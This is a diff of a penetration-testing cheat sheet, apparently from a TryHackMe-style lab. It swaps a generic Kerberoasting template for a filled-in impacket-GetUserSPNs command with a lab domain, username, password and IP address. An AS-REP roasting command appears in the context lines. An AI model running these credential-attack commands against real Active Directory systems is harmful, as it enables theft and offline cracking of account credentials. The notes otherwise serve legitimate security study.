@@ -363,7 +363,7 @@ impacket-GetNPUsers domain.local/ -dc-ip <IP> -usersfile userlist.txt
 ## Kerberoast
 -> impacket-GetUserSPNs
 ```bash
-impacket-GetUserSPNs <domain>/<user>:<password>// -dc-ip <IP> -request
+impacket-GetUserSPNs raz0rblack.thm/twilliams:roastpotatoes -dc-ip 10.48.185.106  -request 
 ```
 or  
 ```bash
